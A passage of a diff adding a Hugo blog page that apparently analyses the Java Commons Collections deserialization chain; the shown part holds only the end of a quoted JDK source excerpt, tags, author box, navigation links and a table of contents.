+                      value instanceof ExceptionProxy)) {
+                    value = new AnnotationTypeMismatchExceptionProxy(
+                            value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
+                                annotationType.members().get(name));
+                }
+            }
+            mv.put(name, value);
+        }
+</code></pre>
+
+        </div>
+        
+        <div class="my-4">
+    
+    <a href="/tags/java%E5%AE%89%E5%85%A8/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 mr-2 hover:text-eureka">#java安全</a>
+    
+    <a href="/tags/web/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 mr-2 hover:text-eureka">#web</a>
+    
+</div>
+        
+        
+        
+
+
+        
+        
+        <div class="py-2">
+    
+    <div class="flex flex-col md:flex-row items-center my-8">
+        <a href="/authors/tigger/" class="w-24 h-24 md:mr-4">
+            
+            
+            <img src="/images/t.jpg" class="w-full bg-primary-bg rounded-full" alt="Avatar">
+            
+        </a>
+        <div class="w-full md:w-auto mt-4 md:mt-0">
+            <a href="/authors/tigger/" class="block font-bold text-lg pb-1 mb-2 border-b">Tigger</a>
+            <span class="block pb-2">There is something you must always remember. You are braver than you believe, stronger than you seem, and smarter than you think.</span>
+            
+            
+            
+            
+            
+            <a href="mailto:example@example.com" class="mr-1">
+                <i class="fas fa-envelope"></i>
+            </a>
+            
+            
+            
+            
+            
+            <a href="https://example.com/" class="mr-1">
+                <i class="fab fa-twitter"></i>
+            </a>
+            
+            
+            
+            
+            
+            <a href="https://example.com/" class="mr-1">
+                <i class="fab fa-github"></i>
+            </a>
+            
+        </div>
+    </div>
+    
+</div>
+        
+        
+        
+<div class="flex flex-col md:flex-row md:justify-between -mx-2 mt-4 px-2 pt-4 border-t">
+    <div>
+        
+        <span class="block font-bold">Previous</span>
+        <a href="/posts/22205/" class="block">CVE-2021-22205 复现</a>
+        
+    </div>
+    <div class="md:text-right mt-4 md:mt-0">
+        
+        <span class="block font-bold">Next</span>
+        <a href="/posts/j1/" class="block">JAVA安全基础之动态代理</a>
+        
+    </div>
+</div>
+
+        
+
+
+
+    </div>
+    
+    <div class="col-span-2">
+        
+        
+        <div class="sticky top-16 z-10 hidden lg:block px-6 py-4  bg-primary-bg ">
+    <span class="text-lg font-semibold">On This Page</span>
+</div>
+<div class="sticky-toc hidden lg:block px-6 pb-6 ">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#一复现环境">一、复现环境</a></li>
+    <li><a href="#二分析">二、分析</a>
+      <ul>
+        <li><a href="#constanttransformer类">ConstantTransformer类</a></li>
+        <li><a href="#invokertransformer">InvokerTransformer</a></li>
+        <li><a href="#chainedtransformer">ChainedTransformer</a></li>
+        <li><a href="#transformedmap类">TransformedMap类</a></li>
+        <li><a href="#abstractinputcheckedmapdecoratormapentry">AbstractInputCheckedMapDecorator.MapEntry</a></li>
+        <li><a href="#annotationinvocationhandler类jdk版本要小于18">AnnotationInvocationHandler类（JDK版本要小于1.8）</a></li>
+        <li><a href="#payload">Payload</a></li>
+      </ul>
+    </li>
+    <li><a href="#三总结">三、总结</a></li>
+  </ul>
+</nav>
+</div>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        enableStickyToc();
+    });
+</script>
+        
+    </div>
+    
+
+    
+    
+    <div
+        class="col-span-2  lg:col-span-6 bg-secondary-bg rounded p-6">
+        <h2 class="text-lg font-semibold mb-4">See Also</h2>
+        <div class="content">
+            
+            <a href="/posts/j1/">JAVA安全基础之动态代理</a>
+            <br />
+            
+        </div>
+    </div>
+    
+</div>
+<script>
+    document.addEventListener('DOMContentLoaded', ()=>{
+        hljs.initHighlightingOnLoad();
+    })
+</script>
+
+      </div>
+    </div>
+    
+  </main>
+  <footer class="pl-scrollbar">
+    <div class="w-full max-w-screen-xl mx-auto"><div class="text-center p-6 pin-b">
+    <p class="text-sm text-tertiary-text">&copy; 2021 <a href="http://www.cnaloha.com/">Tigger</a>
+ &middot;  Powered by the <a href="https://github.com/wangchucheng/hugo-eureka" class="hover:text-eureka">Eureka</a> theme for <a href="https://gohugo.io" class="hover:text-eureka">Hugo</a></p>
+</div></div>
+  </footer>
+</body>
+
+</html>
